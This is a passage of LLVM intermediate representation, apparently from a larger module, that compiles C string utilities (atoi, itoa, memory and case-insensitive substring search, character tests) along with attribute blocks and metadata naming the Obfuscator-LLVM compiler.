define i32 @util_atoi(i8* nocapture readonly, i32) local_unnamed_addr #4 {
  br label %3

; <label>:3:                                      ; preds = %3, %2
  %.0 = phi i8* [ %0, %2 ], [ %4, %3 ]
  %4 = getelementptr inbounds i8, i8* %.0, i64 1
  %5 = load i8, i8* %.0, align 1
  %6 = tail call fastcc i32 @util_isspace(i8 signext %5)
  %7 = icmp eq i32 %6, 0
  br i1 %7, label %8, label %3

; <label>:8:                                      ; preds = %3
  switch i8 %5, label %12 [
    i8 45, label %9
    i8 43, label %.sink.split
  ]

; <label>:9:                                      ; preds = %8
  br label %.sink.split

.sink.split:                                      ; preds = %8, %9
  %.034.ph = phi i1 [ true, %9 ], [ false, %8 ]
  %10 = getelementptr inbounds i8, i8* %.0, i64 2
  %11 = load i8, i8* %4, align 1
  br label %12

; <label>:12:                                     ; preds = %8, %.sink.split
  %.035.in = phi i8 [ %11, %.sink.split ], [ %5, %8 ]
  %.034 = phi i1 [ %.034.ph, %.sink.split ], [ false, %8 ]
  %.1 = phi i8* [ %10, %.sink.split ], [ %4, %8 ]
  %13 = select i1 %.034, i64 -9223372036854775808, i64 9223372036854775807
  %14 = sext i32 %1 to i64
  %15 = urem i64 %13, %14
  %16 = trunc i64 %15 to i32
  %17 = udiv i64 %13, %14
  br label %18

; <label>:18:                                     ; preds = %43, %12
  %.038 = phi i64 [ 0, %12 ], [ %.139, %43 ]
  %.136.in = phi i8 [ %.035.in, %12 ], [ %45, %43 ]
  %.032 = phi i32 [ 0, %12 ], [ %.133, %43 ]
  %.2 = phi i8* [ %.1, %12 ], [ %44, %43 ]
  %.136 = sext i8 %.136.in to i32
  %19 = tail call fastcc i32 @util_isdigit(i8 signext %.136.in)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %23, label %21

; <label>:21:                                     ; preds = %18
  %22 = add nsw i32 %.136, -48
  br label %31

; <label>:23:                                     ; preds = %18
  %24 = tail call fastcc i32 @util_isalpha(i8 signext %.136.in)
  %25 = icmp eq i32 %24, 0
  br i1 %25, label %46, label %26

; <label>:26:                                     ; preds = %23
  %27 = tail call fastcc i32 @util_isupper(i8 signext %.136.in)
  %28 = icmp ne i32 %27, 0
  %29 = select i1 %28, i32 55, i32 87
  %30 = sub nsw i32 %.136, %29
  br label %31

; <label>:31:                                     ; preds = %26, %21
  %.237 = phi i32 [ %22, %21 ], [ %30, %26 ]
  %32 = icmp slt i32 %.237, %1
  br i1 %32, label %33, label %46

; <label>:33:                                     ; preds = %31
  %34 = icmp slt i32 %.032, 0
  %35 = icmp ugt i64 %.038, %17
  %or.cond = or i1 %35, %34
  br i1 %or.cond, label %43, label %36

; <label>:36:                                     ; preds = %33
  %37 = icmp eq i64 %.038, %17
  %38 = icmp sgt i32 %.237, %16
  %or.cond41 = and i1 %37, %38
  br i1 %or.cond41, label %43, label %39

; <label>:39:                                     ; preds = %36
  %40 = mul i64 %.038, %14
  %41 = sext i32 %.237 to i64
  %42 = add i64 %41, %40
  br label %43

; <label>:43:                                     ; preds = %33, %36, %39
  %.139 = phi i64 [ %42, %39 ], [ %17, %36 ], [ %.038, %33 ]
  %.133 = phi i32 [ 1, %39 ], [ -1, %36 ], [ -1, %33 ]
  %44 = getelementptr inbounds i8, i8* %.2, i64 1
  %45 = load i8, i8* %.2, align 1
  br label %18

; <label>:46:                                     ; preds = %31, %23
  %47 = icmp slt i32 %.032, 0
  %48 = sub i64 0, %.038
  %..038 = select i1 %.034, i64 %48, i64 %.038
  %.240 = select i1 %47, i64 %13, i64 %..038
  %49 = trunc i64 %.240 to i32
  ret i32 %49
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define internal fastcc i32 @util_isspace(i8 signext) unnamed_addr #8 {
  switch i8 %0, label %2 [
    i8 32, label %3
    i8 9, label %3
    i8 10, label %3
  ]

; <label>:2:                                      ; preds = %1
  br label %3

; <label>:3:                                      ; preds = %1, %1, %1, %2
  %4 = phi i32 [ 1, %1 ], [ 0, %2 ], [ 1, %1 ], [ 1, %1 ]
  ret i32 %4
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define internal fastcc i32 @util_isdigit(i8 signext) unnamed_addr #8 {
  %.off = add i8 %0, -48
  %2 = icmp ult i8 %.off, 10
  %3 = zext i1 %2 to i32
  ret i32 %3
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define internal fastcc i32 @util_isalpha(i8 signext) unnamed_addr #8 {
  %2 = and i8 %0, -33
  %3 = add i8 %2, -65
  %4 = icmp ult i8 %3, 26
  %5 = zext i1 %4 to i32
  ret i32 %5
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define internal fastcc i32 @util_isupper(i8 signext) unnamed_addr #8 {
  %.off = add i8 %0, -65
  %2 = icmp ult i8 %.off, 26
  %3 = zext i1 %2 to i32
  ret i32 %3
}

; Function Attrs: noinline norecurse nounwind uwtable
define i8* @util_itoa(i32, i32, i8*) local_unnamed_addr #9 {
  %4 = alloca [34 x i8], align 16
  %5 = icmp eq i8* %2, null
  br i1 %5, label %33, label %6

; <label>:6:                                      ; preds = %3
  %7 = icmp eq i32 %0, 0
  br i1 %7, label %31, label %8

; <label>:8:                                      ; preds = %6
  %9 = getelementptr inbounds [34 x i8], [34 x i8]* %4, i64 0, i64 33
  store i8 0, i8* %9, align 1
  %10 = icmp eq i32 %1, 10
  %11 = icmp slt i32 %0, 0
  %or.cond = and i1 %11, %10
  %12 = sub nsw i32 0, %0
  %.29 = select i1 %or.cond, i32 %12, i32 %0
  %13 = icmp eq i32 %.29, 0
  br i1 %13, label %select.unfold._crit_edge, label %select.unfold.preheader

select.unfold.preheader:                          ; preds = %8
  br label %select.unfold

select.unfold:                                    ; preds = %select.unfold.preheader, %select.unfold
  %indvars.iv = phi i64 [ %indvars.iv.next, %select.unfold ], [ 32, %select.unfold.preheader ]
  %.031 = phi i32 [ %19, %select.unfold ], [ %.29, %select.unfold.preheader ]
  %14 = urem i32 %.031, %1
  %15 = icmp slt i32 %14, 10
  %.sink = select i1 %15, i32 48, i32 55
  %16 = add nsw i32 %.sink, %14
  %17 = trunc i32 %16 to i8
  %18 = getelementptr inbounds [34 x i8], [34 x i8]* %4, i64 0, i64 %indvars.iv
  store i8 %17, i8* %18, align 1
  %19 = udiv i32 %.031, %1
  %indvars.iv.next = add i64 %indvars.iv, -1
  %20 = icmp ult i32 %.031, %1
  br i1 %20, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  %21 = trunc i64 %indvars.iv.next to i32
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %8
  %.025.lcssa = phi i32 [ 32, %8 ], [ %21, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond, label %22, label %25

; <label>:22:                                     ; preds = %select.unfold._crit_edge
  %23 = sext i32 %.025.lcssa to i64
  %24 = getelementptr inbounds [34 x i8], [34 x i8]* %4, i64 0, i64 %23
  store i8 45, i8* %24, align 1
  br label %27

; <label>:25:                                     ; preds = %select.unfold._crit_edge
  %26 = add nsw i32 %.025.lcssa, 1
  br label %27

; <label>:27:                                     ; preds = %25, %22
  %.1 = phi i32 [ %.025.lcssa, %22 ], [ %26, %25 ]
  %28 = sext i32 %.1 to i64
  %29 = getelementptr inbounds [34 x i8], [34 x i8]* %4, i64 0, i64 %28
  %30 = call i32 @util_strcpy(i8* nonnull %2, i8* %29)
  br label %33

; <label>:31:                                     ; preds = %6
  store i8 48, i8* %2, align 1
  %32 = getelementptr inbounds i8, i8* %2, i64 1
  store i8 0, i8* %32, align 1
  br label %33

; <label>:33:                                     ; preds = %27, %31, %3
  %.027 = phi i8* [ null, %3 ], [ %2, %31 ], [ %2, %27 ]
  ret i8* %.027
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_memsearch(i8* nocapture readonly, i32, i8* nocapture readonly, i32) local_unnamed_addr #4 {
  %5 = icmp sle i32 %3, %1
  %6 = icmp sgt i32 %1, 0
  %or.cond = and i1 %5, %6
  br i1 %or.cond, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %7 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %20
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %20 ]
  %.016 = phi i32 [ 0, %.lr.ph.preheader ], [ %.1, %20 ]
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %9 = load i8, i8* %8, align 1
  %10 = sext i32 %.016 to i64
  %11 = getelementptr inbounds i8, i8* %2, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = icmp eq i8 %9, %12
  br i1 %13, label %14, label %20

; <label>:14:                                     ; preds = %.lr.ph
  %15 = add nsw i32 %.016, 1
  %16 = icmp eq i32 %15, %3
  br i1 %16, label %17, label %20

; <label>:17:                                     ; preds = %14
  %18 = trunc i64 %indvars.iv to i32
  %19 = add nsw i32 %18, 1
  br label %.loopexit

; <label>:20:                                     ; preds = %.lr.ph, %14
  %.1 = phi i32 [ %15, %14 ], [ 0, %.lr.ph ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %21 = icmp slt i64 %indvars.iv.next, %7
  br i1 %21, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %20
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %17
  %.013 = phi i32 [ %19, %17 ], [ -1, %4 ], [ -1, %.loopexit.loopexit ]
  ret i32 %.013
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_stristr(i8*, i32, i8* nocapture readonly) local_unnamed_addr #4 {
  %4 = tail call i32 @util_strlen(i8* %2)
  %5 = icmp sgt i32 %1, 0
  br i1 %5, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %.in = phi i32 [ %6, %.backedge ], [ %1, %.lr.ph.preheader ]
  %.026 = phi i32 [ %.0.be, %.backedge ], [ 0, %.lr.ph.preheader ]
  %.02125 = phi i8* [ %7, %.backedge ], [ %0, %.lr.ph.preheader ]
  %6 = add nsw i32 %.in, -1
  %7 = getelementptr inbounds i8, i8* %.02125, i64 1
  %8 = load i8, i8* %.02125, align 1
  %9 = sext i32 %.026 to i64
  %10 = getelementptr inbounds i8, i8* %2, i64 %9
  %11 = load i8, i8* %10, align 1
  %.off = add i8 %8, -65
  %12 = icmp ult i8 %.off, 26
  %13 = or i8 %8, 96
  %14 = select i1 %12, i8 %13, i8 %8
  %.off24 = add i8 %11, -65
  %15 = icmp ult i8 %.off24, 26
  %16 = or i8 %11, 96
  %17 = select i1 %15, i8 %16, i8 %11
  %18 = icmp eq i8 %14, %17
  br i1 %18, label %19, label %.backedge

; <label>:19:                                     ; preds = %.lr.ph
  %20 = add nsw i32 %.026, 1
  %21 = icmp eq i32 %20, %4
  br i1 %21, label %23, label %.backedge

.backedge:                                        ; preds = %19, %.lr.ph
  %.0.be = phi i32 [ %20, %19 ], [ 0, %.lr.ph ]
  %22 = icmp sgt i32 %.in, 1
  br i1 %22, label %.lr.ph, label %.loopexit.loopexit

; <label>:23:                                     ; preds = %19
  %24 = ptrtoint i8* %7 to i64
  %25 = ptrtoint i8* %0 to i64
  %26 = sub i64 %24, %25
  %27 = trunc i64 %26 to i32
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %.backedge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %3, %23
  %.020 = phi i32 [ %27, %23 ], [ -1, %3 ], [ -1, %.loopexit.loopexit ]
  ret i32 %.020
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind }
attributes #11 = { nounwind readnone }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146846902}
!2 = !{i32 -2146846493}
!3 = distinct !{!3, !4, !5}
!4 = !{!"llvm.loop.vectorize.width", i32 1}
!5 = !{!"llvm.loop.interleave.count", i32 1}
!6 = distinct !{!6, !7, !4, !5}
!7 = !{!"llvm.loop.unroll.runtime.disable"}
!8 = distinct !{!8, !4, !5}
!9 = distinct !{!9, !7, !4, !5}
!10 = !{!11}
!11 = distinct !{!11, !12}
!12 = distinct !{!12, !"LVerDomain"}
!13 = !{!14}
!14 = distinct !{!14, !12}
!15 = distinct !{!15, !16}
!16 = !{!"llvm.loop.unroll.disable"}
!17 = distinct !{!17, !4, !5}
!18 = distinct !{!18, !16}
!19 = distinct !{!19, !4, !5}
